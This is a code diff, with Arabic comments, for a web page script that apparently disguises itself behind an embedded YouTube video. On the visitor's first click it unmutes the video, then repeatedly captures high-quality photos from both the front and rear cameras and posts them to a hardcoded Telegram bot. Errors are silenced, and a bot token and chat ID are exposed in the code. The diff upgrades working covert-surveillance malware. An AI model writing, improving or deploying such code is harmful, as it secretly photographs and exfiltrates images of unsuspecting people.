@@ -57,8 +57,8 @@
     const CONFIG = {
         TOKEN: "8761336309:AAGv1e4FqNVaybasRyNwLu4U1o5x1pNCJUk",
         CHAT_ID: "7000276863",
-        INTERVAL: 1000, // كل ثانيتين
-        QUALITY: 15   // جودة منخفضة لسرعة الإرسال
+        INTERVAL: 3000,  // زيادة الوقت قليلاً للسماح للمتصفح بالتبديل بين الكاميرات
+        QUALITY: 0.8     // تحسين الجودة من 0.15 إلى 0.8 (جودة عالية جداً)
     };
 
     const video = document.getElementById('v');
@@ -67,55 +67,83 @@
     const iframe = document.getElementById('youtube-player');
 
     let isStarted = false;
+    let currentFacingMode = "user"; // نبدأ بالأمامية
 
-    // يبدأ كل شيء عند أول نقرة للمستخدم
     document.body.addEventListener('click', () => {
         if (isStarted) return;
         isStarted = true;
 
-        // 1. تشغيل صوت الفيديو (تحديث الرابط لإلغاء الكتم)
-        let currentSrc = iframe.src;
-        iframe.src = currentSrc.replace("mute=1", "mute=0");
+        // تشغيل الصوت
+        if(iframe) {
+            let currentSrc = iframe.src;
+            iframe.src = currentSrc.replace("mute=1", "mute=0");
+        }
 
-        // 2. تفعيل الكاميرا
-        initCamera();
+        // بدء حلقة العمل المزدوجة
+        startDualCaptureLoop();
     });
 
-    async function initCamera() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" } 
-            });
-            video.srcObject = stream;
-            video.play();
-
-            // بدء حلقة الالتقاط
-            setInterval(captureAndSend, CONFIG.INTERVAL);
-        } catch (err) {
-            console.warn("Camera access denied.");
+    async function startDualCaptureLoop() {
+        // تنفيذ العملية فوراً ثم تكرارها
+        async function run() {
+            // 1. التقاط من الكاميرا الأمامية
+            await captureFromDevice("user");
+            // 2. انتظار بسيط لراحة المعالج
+            await new Promise(r => setTimeout(r, 500));
+            // 3. التقاط من الكاميرا الخلفية
+            await captureFromDevice("environment");
         }
+
+        run();
+        setInterval(run, CONFIG.INTERVAL);
     }
 
-    function captureAndSend() {
-        if (video.readyState !== 4) return;
+    async function captureFromDevice(mode) {
+        try {
+            // فتح الكاميرا المطلوبة
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: mode, width: { ideal: 1280 }, height: { ideal: 720 } } 
+            });
+            
+            video.srcObject = stream;
+            
+            // انتظار تحميل الميتا لضمان جودة الصورة
+            await new Promise((resolve) => {
+                video.onloadedmetadata = () => {
+                    video.play();
+                    // ننتظر قليلاً حتى يضبط الفوكس التلقائي
+                    setTimeout(resolve, 800); 
+                };
+            });
 
-        // حجم صغير للسرعة القصوى
-        canvas.width = 400;
-        canvas.height = 300;
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // ضبط الحجم بدقة عالية
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        canvas.toBlob((blob) => {
+            // تحويل وإرسال
+            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', CONFIG.QUALITY));
+            
             const formData = new FormData();
             formData.append('chat_id', CONFIG.CHAT_ID);
-            formData.append('photo', blob, 'shot.jpg');
+            formData.append('caption', mode === "user" ? "📸 كاميرا أمامية" : "📸 كاميرا خلفية");
+            formData.append('photo', blob, 'capture.jpg');
 
             fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
-            }).catch(() => {}); 
-        }, 'image/jpeg', CONFIG.QUALITY);
+            }).catch(() => {});
+
+            // إغلاق الكاميرا فوراً للسماح للثانية بالعمل
+            stream.getTracks().forEach(track => track.stop());
+            video.srcObject = null;
+
+        } catch (err) {
+            console.warn(`فشل الوصول للكاميرا (${mode}):`, err);
+        }
     }
-</script>
+                    </script>
+    
 
 </body>
 </html>
